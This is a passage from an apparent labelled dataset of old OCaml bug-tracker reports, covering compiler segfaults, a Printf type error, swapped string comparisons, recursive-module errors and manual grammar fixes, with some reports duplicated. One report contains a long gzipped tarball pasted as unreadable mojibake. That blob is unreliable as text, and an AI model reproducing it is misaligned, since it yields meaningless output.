:= b;\n\nThis works when sync_framerate *is* provided, but segfaults when it is\nabsent.  (Oddly, putting the match inside a subfunction and calling that\nsolves the problem.)\n\n\n\n\nThe bytecode and native code executables have the same behaviour for me.\n\n\nSorry for the English-only; sadly, I'm a monoglot,\n\nCheers,\n  --Ryan\n"},{"labels":["bug"],"text":"**Original bug ID:** 1677\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi all,\n   Maybe my imagination is too limited here.  But I can't think of any\nreason why replacing the first expression with the second expression\nshould cause my program to segfault.\n\nmatch sync_framerate with\n     _ -> ();\n\nmatch sync_framerate with\n     _ -> ()\n   | _ -> (); \n\n\nI'm working on a mixed c++/caml class project.  It's a bit annoying to\ncompile (requires ocamlgsl).  But if you untar this, it has a bytecode\nexecutabe already built at \"gawalker/caml_src/a.out\".\n\nhttp://www.ffh.us/ryan/temp/gawalker.tgz\n\nWhat I *want* to do is have an boolean optional argument to the function\n\"runworld\".  Thus:\n\n let runworld \t\n   ?(sync_framerate)\t\n   ?(draw=true) ?(plot=false) ?(ticks= -1)\n   ?(closewin=true)\t\t\n   walker display  =  ...\t\n\nThen, if the sync_framerate argument is supplied I want to set a global\nvariable to its contents.\n\n   match sync_framerate with \n       None -> ()\n     | Some b -> compensate_framerate := b;\n\nThis works when sync_framerate *is* provided, but segfaults when it is\nabsent.  (Oddly, putting the match inside a subfunction and calling that\nsolves the problem.)\n\n\n\n\nThe bytecode and native code executables have the same behaviour for me.\n\n\nSorry for the English-only; sadly, I'm a monoglot,\n\nCheers,\n  --Ryan\n"},{"labels":["bug"],"text":"**Original bug ID:** 1676\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Anton Moscal\nVersion: CVS snapshot 06 May 2003\nOS: Linux\nSubmission from: 212.113.104.16 (212.113.104.16)\n\n\nDuring compilation of the following test:\n\nlet _ = Printf.printf \"%b\\n\" true\n\nproduce error message:\n\nFile \"b.ml\", line 1, characters 29-33:\nThis expression has type bool but is here used with type int\n"},{"labels":["bug"],"text":"**Original bug ID:** 1675\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #6249\n\n## Bug description\n\nFull_Name: Anton Moscal\nVersion: CVS snapshot 06 May 2003\nOS: Linux\nSubmission from: 212.113.104.16 (212.113.104.16)\n\n\nDuring compilation of the following test:\n\nlet _ = Printf.printf \"%b\\n\" true\n\nproduce error message:\n\nFile \"b.ml\", line 1, characters 29-33:\nThis expression has type bool but is here used with type int\n"},{"labels":["bug"],"text":"**Original bug ID:** 1674\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Andrey Simanovsky\nVersion: cvs snapshot 06 May 2003\nOS: Linux\nSubmission from: 212.113.104.16 (212.113.104.16)\n\n\nString comparison functions <, <=, >, >= work incorrectly (< and <= are\nconfused, as well as > and >=). A test:\n\nlet a = \"string\";;\nPrintf.printf \"%s\\n\" (if \"string\" < a then \"true\" else \"false\")\n\nThe error is in string_lessthan, string_lessequal etc.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1673\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n    I've attached a gzipped tarball which causes the problem on 3.06 and above, \nincluding the latest CVS snapshots. See the file test.ml. At the very end I \ncall a function on a type I shouldn't be able to and get a segfault. The code \nessentially follows the code in Jacques Garrigue's \"Code reuse through \nPolymorphic Variants\", but the application is modeling an evaluator for \nabutting rectangular geometric structures on a plane. Run \n\ntouch depend\nmake depend\nmake\npvtst\n\nand you'll get the segfault. \n\n    All attempts to create a cell.mli file for cell.ml failed. ocamlc -i \ngenerated a \"signature\" which didn't match. So I guess this is two bug reports, \none for the unsoundness, and one for this behavior, but I guess they are \nrelated. \n\n-- Brian\n\n\n----------------\n\u001fâ¹\b\b\u0013ÃÂ¶>\u0000\u0003bug.tar\u0000Ã­\u001bksÃ62_?Â¿\u0002uââ°Ã¨âeÃÃÂ«zÃÅÃ£8Â­oÃ²Ã°ÃÃ4?ÃU \nÂ²?Ã°Â¡ââ-MâÃ»Ã­Â·Â»\u0000H?Â¢dÂ·â°?ÃÃËÃ\u0012?ÃÂ¾Â°Ã]@K_\u0004ÃÃºÂ½âºmÃ­Ã¶V{w{\u001b>ÃÃ­Ã?Ã²Â§nÃ·Â°\u0003ÃVÂ»\rÃ½?vg{Ã§\u001eÃÂ¾aÂ¾Â¨MÃÅ'ÅÃÃ«?âÂ¥pW?Â£ÃÃÃµÃ?Â­0Â¸)\u001aÂ°Å¾Ã­?Â­Ã¶Â¢ÃµÃ\u0002Ã«ÃÃ«Â¿Â±Â½Â³Â¹\tÃ°?Â­Ã?{Â¬}S\fÃÃ­;_Ã¿x,\"Ã¶Â³ËCâ%3â¡Å¾NE\u0012ÃË\u0007Å½\u0013ËÅ%Ãg>\u000f\u0002âÅ `Ã<ÃµÃ\u0018N\"6ek?Â­Â¡Â©Ã»ÃOÅ½âÃÃâÂ¡=Ãµdâ!Ã¼_\u000eÆF=\u0011\u000f\u0005Ã«Â²Â½,\u000e[ÃOEÂ¿\\4Ã°AFÆÂº~1ÃDâÂ¥0d8o?cÂ g?d \u0004\u0002Ã '\u000bdj?Ãâ,?âËâºÃxâÃ°\u0019\u0002~Ãâ4\u001eÃ±&{ÃwYÅ¸Â§ÃÃ¯ÃÃ¬4K&~6I\u0004Ã³\bÃ¥[Ã¶Ã®Â¹Ã C\u0016\u000fÃ#\u000e=\u001fÃÂ»Ã£Ã¸â\u001eÃ»\nÂ£ÃªÃ?\u0003Â»Ã³Â¬J\u0002âÆÂ¾\u001ayGAËÂ§ÃÂ±Z(ÃÃ¡Â â¢\u001aH\u000fÃ±Ã»q\u0004=\u001c%â'Ã¤Ã²Ã­c\u0005ÅÃ?\u0000Q/ÃY\u00195\u0002jAÃ¿Â¢\u0007\u0002\u0007Ãâ¢Ã±ÃÃ±Å PJÃ¥LM\u001b\u0007Ã\u0017!,\u001bÃÃÂ¿â Â´\u0015\u0000*\u0019?Ã£\u0012Â Ã¹â¦\u001f\u000eâ\u0003\"ZÂ  PÃ¤ÃÃ¦ÃSDÂ«Ã¤<â¹ÅEÃSHr2Â´â SÃ¨VÂ«95Ã½Â¸â~\u001cÂ¤â|Â¨p\r\t\u000fÃ\u001f\u0012\u0017\bIËÃ£a\u000f`â¢Â¬ÃËÂ§\u0011Ã\u0005ZÃ±rÃÃ³JÃ±,zâ}â'M4\u0001Ã¦<Â¶â¡Ã¶ÃââÃ\u0014Â§%V\u0010â\f\u0012`?LhÅ Ã°xmâ¢?ÃÂ­Ãâ\\âd\"NKÂ¬?L(\u0004Ã*â¢Ãâ¦bIy?neWÂ¡Å¸*\\\u0012LFÃ·ÃÃ¨5â¹^Â·\u0004SÃY\u0018w\rÃ¢Å¡-P?ÃÃ»Å¡Â¬G$Ã²\u000eEÂ¢Å\u001eÃ¥C9kÃ´laÃªÂ¹U\u0013Ã·zâa{=P&2P!â¢Å½Ã¢Ã\u001ey\u001eâÃ²|â¦\u0003Ã°Ã·FÃÃ°Ã½<\u001bÃ¡ha_0ËÃ\u0002Â­Â¬Â¨Â¾aÅÂ !Â°6Ãb6NÃâ¬\u0010\fbÃ¢XÃ¢B>ÃÂ±âËÃ´z'Â¬Ã«Â±\u001f\u0012Ã¶\u0007[iÂ²\u0015Ã¸h(ZÃ§Ã\u0011\u0010r\tN\u0004Â©ËâºP\u00039Ë#?âÃ´CbÃâ\u0001Å \u0002?Â¥1Â¯\u0011Ã\u0003aÂ¯Â¯1ÃrÂ«Ã¨qÃ/Ã@âÅ½â¢Ã« ÃºÃÂ BÅ¾Ã¹#â DÃÂ¥ÃF4]9\u00122ââ¢\u0000Â¾vâ¢\u0002ÃÂ¤Ã-BE\u0002 Å¡Ã â5IâÃº\rârâi\u000e\u0015Ã²Â±\nÃÃ¤Â­ÃÃP\u001fÃ´Â Â¨Â¹6â Â£\u00045ÃJÃÃ´ÃV`KÂ½}88Ã«Ã¾Ã§aÃºxâ¦Â¨7lcQÂ´Ã\"ËÃ¹WÂ²Ã«\u001eÂ»Â®?Â Ã-lÃ¹Ã«pâºÃ§.8Â¨pSÃ¶â[LÃ?iÃÃNÃÂ¾ZÂ£Ã¼?Ã¤\u001fD\u000bÂ²Â¢\u001bÂ¢Â¡Ã²Ã¿Â­â¦Ã§Â¿Â­NÃÃ¤Ã¿?m<'t:;?ÃÂ»Ã¼Ã¿6ÃÃº\b2Ã u\u0010nÂ½/Â£ÃµÃÃ§a0\u0010cÂ¶\nÃAIÃÂ£Â·Â GD\u0003Â§\u0006\u0016|?dk>Ã'HÃ§â¢\f\u0004Ã¬QÃµ\u0004.Å¸Ã²Ã¬N{\u0017\\Ã±Ë'Ãâ¡t<eâº;kâºÂ»]Ã§t$S&Â¦\u0010FÃTÃ\u0011\u001bAÃªË)1l|HâÃ»Ë]ÃÅ¸GÂ¼>OÃÂ©)Â¦âº\u0000Â¡Ã²Ã¬Ã¾\u0004rââ?\u0004\u0004Ã¡I\nÃ\t}1Ã¡\u0004Ã ÃA3Ã¯Â²ÃÃUÃ¶â8Ã´ÃÃ¸Å\u001d$\t\u0004Âµ?Ã¯Ã\u0003ÃÃ¾Ã\u000b|S4Â®ÃÃ¿âºâºÃÃ¦Ã¾gâÃºÃ±Ã¼ÃÂ¾ÃÃ¿Â·Ã2}Ãâ¡Ã Â»ÅÃ£I\u001bÂ¾AÃ®Â«\u000fÃÃ¸Ã ËÃÂ²\bÃFâCOÂ¯\u0007?â°4SÂ¸\râ¢k@OsÃ¨Ã©2Ã¨Â¯Â­ÃoÂ ÃÃ¾\u0001Å½q\bÅ¾Ã»â h,ÃÃ¿?ÃN{ÃÃÃ¿Ã?Â­\u001dÅ Ã¿\u001b[wÃ»Ã¿6ÃÃ½Ã/ÃÃ®;Ã·Ã«\u000eLÂ»-ÃÃ³ÂªÃ¿^Ã¸â¢Â¼\u0010l\u001fR?Å½Ã§\u001fÃ³s$E\u0002Â©ÃÂ¯BÂ¦M8Ã¾ÃÃ¯Ã¡ÅÂ±Å¸HÂ°Â Â Ã\u000e_\u001e\u001fÃ®Â±Ã£ÃÃ¿s\"\"?Å¾$Ã\rÃ±Â³\u001f?gâ°<\u001feÂ¬Ã³Ã£?Ã¿fx?&3Ã|^Ã²\fÃ(\u001e08â\u001e\u000b\u001fÂ² Ã¸ÃÃ â¬t\u0018ÃÂ¹\u001dNÂ¨\u00128c\"3x`do\u0002\u001eZ\rÂ´\u0018{*Ã±Ã¸\u0004I\u0014dNq\u0014ÃXÃÃÃ¨P)?k]Â­Å¸ÃâÃ«\u000bÃa-C?â¹H$ÃgÃÃÃ=FÃÅ¡Å½âÃ¸<Ã¡a\n\u0018â4Ã¶4Ã¶'xC@ÂºfÃµ@\u000eÂªÃ¥4Ã\u0014âeËÃ¤\u001aÂº]Ã¨_[cÂ¿Ã\u0013\u0016NÃ°Ã¨)Â§xYÃ.x\u0000+\u0013\u000fÃµC\"y\u001fË<yÃµÃºxÃ¿Ã âÃµE\u0010_Â¶`jÃ£Â´n\u0018Ã°Ã£4Â¼Ã£F\u00143Â°<%Q\nÃ|?\u0015\bÂ§-Â·BÃO\u0004Ã\u0004Ã£4l2Ã¼&Â°\fÃg\u0000}?Ã\u0013âgÃ¾D\u001b\b\u0011Ã°Â¥\fÃ°Ã¦\rt #\"Â­â¬xÃ¤Kâ\u0002Â·ÃÂ¥\u0000Ã*Ã¸\bÃ£Ã\u0004XhÃ¢ÃpmpÃ¸Â³Ã\f?âcÂ²60Â´âÂ¢â¬]â¬~?Ã²sÂ­âÅ \u0012AÂ¹2\u0002\u0011h%\u0010\u0013\u001cÃ©\u0001\u0017râ¡\fÂ¥Â³4\u0013aS?&âA`Ã®Â¯&*P [ÃÂ·Ã¡Â¶:â¢Ã¥Âª \u001ca|Â¡hâ°Â©Ã°'\u0019Â­\b^ÅÃ£Ã!ÃÂ­Ã\u0019(ÃµÃcÃ³\u0003Ã#â¦ÃpNÂºÂ§Ã\u0011'Â»Ã´Ã±:I?&Ã¶Ã¤xÅÂ¡?}vsâ\u001bÃ»5âÂ ÂµÃ¯\r.@? Ã®\u0004ÃLÃyÂ©Ã¡z\u001eâuÂ²K\u001eexhÂ¬Å¸.ÃÂ´Ã±\u0017ÃlÂ²\u0014\\â¢Â½!\u0000ÃÃâºÆÃ½Â¦Âºâ¦\u0004Â¯â¡\u0014âºxÃ­hc?Ã»dâ\u001cÃ½3nhB?`Ã¡Â¬â¡\u001d]?âyÂ¦Ãb,\u0012\u0000ËÅ½â¦/Ãâ°\u0006Â²Å¸\u0000aÂ°\fâ¬Âº?ÆÃ¼49Ã\u000eC\u001b\u0019Ã®\rÂ 3\u001eI\u001fââ¢'}â¢ÃÂ¼\u0019ÃÅ½ÃºâÃÂµÃ$Ã¬ÃÂ±Â·\tVs>\t ÃÂ°ÃÂ¼Ã°O_Y5YÂ«Ãr\u0011ÃÃÃ¬ÃÂª\u0002ÃÃ³Ã''(#v\u0002WÃ âº\t\u0006tâsÃbÃbÂ´â¢B?â¢qDâ\u0019>5Ã¸Åf\u001bÂ¤\u000f\u001aÂ¿\u001eÅ¾Ã¾Ã²Ã³Ã±ÃÃ/â¡Ã»'.j\nâ¡Â¼J?Ãªâ¹Â¼\bÅ¸\u0011^\u001eÃÃÃ¢\rÃ£\u0000<\u0015\u001a1^\rÃf?@iÃÃªÃxÃ°W Â¥ÃÂ´â5\rÃ¾ÃºÃ¥Ã¡âº*Ã¨Ã«\b\f\u0007ÃÃ³\"\u0019r_T&ÅÅ\u001eWÃ¡kÃÂ®c\ny$Ã0FÂ¾Â¼ÅÃ§Ã¥Ã«\u0017s<Ã-.Hâ?Ã Ã¼\u0001ÃeÃÃ½\u000f`Ã¼\u001aÃÃ©/Ã\u0007{OÃ§pÃ´gâ¢XÂ£???Ã\u0005\u000fÂª\u0002?}Ã²Â¢:Ã¥)Ã8{ÃAÃ/x\u0004\u0004âbÃR/Ã\u000eÃ\u001fÃÃ\\\u001dÂ²ÅÂ¥Å½\u0000Ã¼Â°H\u001eÂ¥Ã¹JÂ¦ÃµaOEÂ½|wPÃ°IY\u0003Ã¼t0\u0019Â Â¶Ã±Â¾hÃ}Å¸Ã¼$>\u0004bZ\nR`[&Â¨yÃªÃ¬ËâPÃ¹Ã¹\u000e\u001fÃ²Ã³\u001d>Ã¨k&Fâ¡Ã0p4}Ã#SÂ¼ÃÃ°D\t\t\u0000Ã;ÃÃâº|âÂ¥ÃrÂ©-âÃ¶Ã·Ã7^;mYÃ\u0005\u001d\u001eÃMÃÃ¾Ã¥Ã¨Lb\u0006\n\u0001Â£,ÃÅ â¢â°Â®?bhÃÃ½\u0011Ã¬$\u000b\u000f\u000fÃË?Ã¸\u0005â°Ã\u0007j?ÃââÂ­\u001dbhâ¬U\u0006Â²Â¯Ã¶Ã·^<?}u\u0004ÃâÃ®Ã­ÅÃ»8Â°?Â±ÃÆ=oÃÃÃ¢>ÃÂ±\u0000Å NÅ¡Ã¶ÃªÃ¨Â´v\u001aP5\u00135ËÃMSÅ¸\u001e\u001cÃNâ¦Â°ÃªXÃ£y\u001fMz~Ã°Â¦v\u0012XÅ½c?Ã§}4Ã©Â·Â½Ã½Ã½ÂºIh{Å½\u0005PtÃªâ¢3)\u0014Â­CÃ¡Ã¿1,Ë\u001cEËÂ°\u0002SÅ¾YahâÂ·Ã^\u0015ÃËÃ¹\u000e\u001eÃ|E'cÂ¾kÃ¡Ã¾Å½ÃWCÂ»\u0002Ã²Â¶â¹Â¼Ã°Ã(Å¾\u0004ÃâP?\"fk>D?84\u0011Â±Ã¢?\u000b?x\u001fâ\u0017@â¬Ã¼\u000f\td_Ã¥\u001aÃÂ¦Ãº\b\u001d}0!?ÃÂ°?Â»!Ã¡\u0010\u0014Ë\u000b\fÂ¸\u0018Å ÃR\u0003SÃ»Â¯ON_Â½Ã°4#ÃÃ¤S1Ã¤ââ¬bYâ N@3ÆÃÂ¬\u0016[Âªe\tÃ£?xt\u000eÂ¤â¢\u0014\u0018Ã\u0002Â `/\bâ¡-\u0014ÃH|\u0012Ã¥Ã«bÃ¶MÃ)â¦\u0019Ã\u0004ââ\u001frÃ?\u000fhÃZ?â¡\u001bÃÃ³|}â&Ã«o:?Ã£?uÃª0?ÃÃ¥8y(Ã²&\u0010|ÃÂ¨Â°GA`Ã¬Ã± Â´âÃÂ¡C\rSHÃ± \u001bÂ¨Ã°â=\nÃÃ\fOÃâ 2ÅÃ®TÂ \u0018'Â¼A?,ÆÃÃÃ©â¡\u0016fxÅ¡Ã·q&.\\ÃÂ¯}nÅ½8OÅ¸Å½\u0012cÅ¾ÃÃ}zÃÃÃ\u0011m\u001eÃ¸e\fÃ?Ã¦Ã1â¢Ã¹dÅfk<Ã©Ã§Â²Ã¦@ÂºÃÃâ¢=Ã¬:\f\u000e`ÃÃ¨Â¶ÂºÃ¦Â±â¦ÃÂ¶sÃ8BÂ½Ãâ¬)tÃÃÃÂ²â?Â©!\nhKÃ¬?Ã¬*ÃÂªâv\u0001vÃ\u0018jâ\u001bÃXÃÂ¤1ÃZ\u0014hÂ¤ÃÂ§Ã§v[;Å¸lx9â|Ã§Ã\"Â ]Â´\u001c?Â±Ã¶ÃÃ¹ÂµâÂ¯Â³â°\u000eE\u0003Ã½Ãâ¦LaÃ¦Ã\u001fÃ\foÃÃ\u001d\u001c\u000fÃÃ¸Â«'Ã¿=Â±Ã6pÃÃ+j\u0018;:]8<\u0005\u001bÃÃÆfâpÂ®Ã³Â¯\u0007\rÅ Â«Ã¨Ã¯â¢âºtÃZlÂ¬\f>ÃÃÂ»9Â¸câ¢\u001f!QÃ´r<Ã°\\3Â¿â¹\n\"\u0016Â¸kOrZ'Â¯Å¸=;|\u0003Ã¢[_\u0019&OâIÃÂµ;Ãâ¢Ãâ¢:Âª\u0000Ã¿Ã`bÂ¨nÃ¾-Ã¾Ã|Ã¶Ã ?4\"Ã©WÆÃ!ÂºÂ¤/3âº?â¢1B\fwqÂ¤Åeâ¢\u0012:\r<]\u0004Å#ÃÃg%Ã\u0018Ã©\u0017 ââ¹\bÃJ\u0004Â«\u0018J\u0014Ã¥r>Ã¤ÃµÃ¸PRâ ÃÅ?\n?5?Â£qÃ¨Ãº\u0000Ãº\u0013Â°Ã¹![\u0005boe<=cÂ«Ã¿c-Ã¸ÃµÂ¾\u00193^Â­Ã¼Â¨Â¼Å¡r|]ÃâsÃ»âtÃÂ­Ã¿\u0015ÃQ\u0019}~itÃ·+ÃÂ·ÃÃ¨Ã·\u001f}â¬Âº)\u001aWÃ¼Ã¾Â»Â½Â³Â»iÃ½Ã¾KÃµ\u001fÃÃ­?Â»ÃnÂ£-Â«Ã¿Â¦Â§}0\u0010UM5ËâÃ¡Â¬Â¨Â¡Ã¼Ã*ÃªÃ¶Ã\n?Â®ÃUuÃ\u000eQ]wÃ­ËÂ©Ã¬Ã¶XÂ£ÃlÂ»s\u0005Ã\u001e{{VSÃ\rÃ\u001f?Å¾Â©ÃÃ­âU*Ã§Ã\u0012tH\u0019Ã¥Â¹ÅËÂ§?Ã¢c~\u001fÃ¢ÂµqâÂºÃµe/xâ@jYâO\u0012)U\n+Â³^Â¨â \u00072Â¤?36ÃEÂ±ÂºZR\u00145nÃº~?@âÂ·Â¢Â \r?LÃR\rÂ¥Ã\u0017Ã§5â¡\nÃ$JÃ¹PÃ´R?xj\n\"Â©&âÂ¨7Â°Ã¨ÃÃÃLm$Â¶F\u0003Q6\tÃÃ{GÂ¼Z1\\â \u001fÂ´âÂª\u0002Ãâ6Â§ÂªV7ÃÃrÃâlÂ¦Ã¾VÃ¢ÃªHÃ¶>\u001fÂ¬Â«\b&\bÂ»â Â²Â¾.Â¸\u001eÂ¬R\u001dÂ¬Â¨}*W\u0014Ãªâ¦Ã°JÃRÃSfÃL|Â§Ã¥VÃ âBÃ¨Â¹â¡Uâ°ÃÂªÃª8Ã¤Q^â°Ã°\u0007AuÃvâ¢Â²Å¾YÃÂ«rÅ½Ã£nAÂºâÂµÂ¼?Ã\u001cÂ«ÂµJTÂ¨Â¨\u0005Â«ÃNÂ«LUÂ«t?â¢ÃÂ¥V\u0016Â¨ÃZ#âÂªÂ³Ã¥0)ÃÂ¡Â°Â¼Â¯bâ¢ÃXÂ¬Â²Ã?\u001f\u0001Â¶RÃ¿Â«Ã\u0015UÃÃ¯]\u000bÃÂª\u0005Â®N^8\u000bmÂ¿f\u001b`â¢pIÅ¸yÂ©pÃ£\u001fÃ\nÃ\u0018Ã²U\u0005ÃÃ\u0014Â»jËÂ§ÃºÃµâ¹Â¢|\u0018[]\t1Â¶Ã»ÂµÃ¯Å¾Â¬=&ÃÃ*ÃUÃÃÃªÃ©\u001fsÂ«o4pk4iâ?a#\u001fÂ¡[ÃÃ²Ã¦Å¡ÃÂ«uÂ­?qEuqh\u001bÃ|ÃÂ®BÃ´\u0016I{\u000f\u0007MÃÂ¤Ã°Ã¥\fh<LWÃÂ«?oÃ¢â Â½\u0005Å Âº^ÃÃ¦Ãµj{\u001dÃ¼â¢{Ã\u001aÂ«Â«Â¬Ã¬Ã¢Wuâ°pÃ*â¦Ã§\u0017\"Ã­uvÃo\u001fÃ3\t\u001fÂ¡Ã¤ÂªÂ¤Â»AÃ¥Ã+4\u0014WÃÃÂ°Ãu]Ã«5\u0006Ã´Æ6Â¶\\?Ã´Ã\u0014nÃ§<Å¾Âº\u0016qÃ»Ã\u000eÅM\u0002Ãk(ZO?\u001dÃ£TrÂ¶Å }âS?Ã9(+(Ã\u000fÂ®Â Â¾T}zUÂ¨\nK=ÃµJ?y3Â§A?eiÃ¬Ã°Â»RLZÂ±ÃÃ±Â°dÃÂ¢Ã²Â¯(\u00151Sâ¢Å :âHULBÂ©Å<âtvÂ¦Â¹dÃÃZyÃâ¦?Â²Ë\u0018ÃÃª\u0005â¢n\rÃ\"QÃµÃ°\"aÂ¥â¹Å½Â·W3Ã²ÃVÆaÂ¾gÂ½Ã²eÂ´aÃâ(Â¤4ÃÃâ°\u001c0Ã´%iA(Ã­iÃ.<ËmY0Ã\u0002Ãâb?ZÃU\u0006-Â´o4OÃ°eÂ¹Ãââ Ã¶QCÃ­Â£Ãl ââÂ­Â¨\u001f\fSÂ¼Â²â)xÂ§Ã#Ã­Å¸\u001aÃpÂª?q$â\u000bÃ°ÃÂ°â[Ã`âÅ½4R5Â¦Ã\u0019?H\u0015\r*Ã3Â¯PÅ¾ÃEyâ¢f!Ãµ\u001cEÃ·ÃÅÂ»ÃµÃ¹Â¯Ã¸UÃ­â¹`-Â·+Ã«Ã¿76â¹Ã·Ã±]â¬ÃÃÃnÃ§Ã®Ã¼w\u001b?Å Ã£qÃ½{Â©\u001cÃAÅ Â½{\u0019'Ã\bSâ¡\u00138_Ãâ\u0003\u000eF\u0007Å¸Â¿\nÃµyËÂ¿Â¾ÆÃËâXÃ©-[Ã³~ aÂ«yÂ¥âYtÂºÃÃ·ÃÂ z\u000fÂ·Ã¾Â½^\r\u0012Ã°â¢HÃªQ_Ã\u0001Ã°ÃeÃ)\u00031Â®Ã­\u0017NÃ¤E\u0005ÃÂ§Ã¯Ã«>â¹Ã¶Â¿Ã¹Â­Ã½â h\\ÂµÃ¿Ã\u001bÃ¹Ã»?Ã?MÃµÃ¾OÃ»Â®Ã¾Ã·VÅ¡ÃÂ¾\u0018Â )3Ã¸Å½ÃâÃ»>\u001bÃ­Â»ÃÃ¦\u0006h\\ÂµÃ¿;VÃ¼ÃÃÃÃºÃ°\u0003ÃwÃ»Ã¿6Å¡Å Ã*Ã¬Ã¢uZÃVÃ©]9ÃmÃÃÃ¥âÂ¨Ã\u0002Âª|âÂª\u0006Â¾Â³Ã¸yÃÃ®Ã]Â»kwÃ­Â®}â¹Ã­Ã¿?ÃÂ¨\t\u0000P\u0000\u0000----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1672\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Yutaka Oiwa\nVersion: 3.06\nOS: SunOS5, Linux\nSubmission from: h219-110-059-210.catv01.itscom.jp (219.110.59.210)\n\n\nRedefining already-open'ed module in toplevel breaks type consistency.\n\n% /usr/bin/ocaml\n        Objective Caml version 3.06\n\n# module M = struct let a = 0 end;;\nmodule M : sig val a : int end\n# open M;;\n# a;;\n- : int = 0\n# module M = struct let a = (0, 0) end;;\nmodule M : sig val a : int * int end\n# a;;\n- : int = 537771982\n# Obj.is_block (Obj.magic a);;\n- : bool = true\n\nVersion 3.06+28 (2003-04-28) in CVS also reproduces this bug.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1671\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Julien Signoles\nVersion: cvs, tag recursive_module\nOS: Linux\nSubmission from: newwww.lri.fr (129.175.15.10)\n\n\nBonjour,\n\n=====\n$ cat foo.ml\nmodule type MT = sig val f : int -> int end\nmodule rec B : MT = struct let f x = x end\nand A : MT  = struct let f = B.f end (* l'appel a B.f est apres la definition de\nB *)\nlet _ = Printf.printf \"%d\\n\" (A.f 5)\n$ ocamlopt -o foo foo.ml\n$ ./foo\n5\n$ cat foo2.ml\nmodule type MT = sig val f : int -> int end\nmodule rec A : MT = struct let f = B.f end (* l'appel a B.f est avant la\ndefinition de B *)\nand B : MT  = struct let f x = x end\nlet _ = Printf.printf \"%d\\n\" (A.f 5)\n$ ocamlopt -o foo2 foo2.ml\n$ ./foo2\nFatal error: exception Undefined_recursive_module(\"foo2.ml\", 4, 13)\n=====\n\nJe pense qu'il n'est pas normal que le comportement soit different dans les 2\nversions.\nIl est a noter que si on eta-expanse A.f (i.e. \"let f x = B.f x\" dans A),\nl'exception n'est jamais levee.\n\n--\nJulien Signoles\n"},{"labels":["bug"],"text":"**Original bug ID:** 1670\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Boris Yakobowski\nVersion: 3.06+29\nOS: Linux\nSubmission from: elrond.residence.ens-lyon.fr (140.77.128.65)\n\n\n# type nat = private O | S of nat;;\ntype nat = virtual O | S of nat\n# module M = (struct type nat = private O | S of nat end :    \n              sig type nat = virtual O | S of nat end);;\nSyntax error: 'end' expected, the highlighted 'sig' might be unmatched\n# module M = (struct type nat = private O | S of nat end :\n              sig type nat = private O | S of nat end);;\nmodule M : sig type nat = virtual O | S of nat end\n\nLes pretty-printer affichent encore les types privÃ©s comme virtuels dans les\nsignatures, ce qui est rejetÃ© par le parseur.\n\nEn tout cas, merci Ã  Pierre pour les types virtuels !\n\n-- \nBoris\n"},{"labels":["bug"],"text":"**Original bug ID:** 1669\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI made the same error in this one as the one about class arguments.\nHere's a revised bug report; please delete the previous one from me\nwith the same subject.\n\nIn the production for class-field, the grammar at\nhttp://caml.inria.fr/ocaml/htmlman/manual017.html says that arguments\nfollowing a method-name must be patterns.  This would disallow keyword\narguments to methods, such as\n\n   class foo = object method bar ~baz = 0 + baz end;;\n\nwhich are accepted by OCAML.  I think the occurrence of \"pattern\" in\n\n   class-field ::= ...\n                 | method [private] method-name {pattern} [:typexpr] = expr\n\nshould be replaced with \"parameter\".\n\n(The error in the previous report was that I wrote \"argument\" instead\nof \"parameter\" in my proposed fix.)\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1668\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI got a vital word wrong in my previous attempt.  Please delete the other one.\n\nThe grammar for class definitions says this is invalid, but OCAML\ntakes it and I use it routinely:\n\n   class foo ~bar = object end;;\n\nI think the word \"pattern\" should be changed to \"parameter\" in this\nproduction for class-binding in Section 6.9.3 of the document:\n\n   class_binding ::= \n      [virtual] [[type-parameters]] class_name {pattern} [:class-type] = \n      class-expr\n\n(The error in the previous report was that I wrote \"argument\" instead\nof \"parameter\" in my proposed fix.)\n-- \nTim Freeman                                                  tim@fungible.com\nWhich is worse: ignorance or apathy? Who knows? Who cares?\nGPG public key fingerprint ECDF 46F8 3B80 BB9E 575D  7180 76DF FE00 34B1 5C78\n"},{"labels":["bug"],"text":"**Original bug ID:** 1667\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe grammar for class definitions says this is invalid, but OCAML\ntakes it and I use it routinely:\n\n   class foo ~bar = object end;;\n\nI think the word \"pattern\" should be changed to 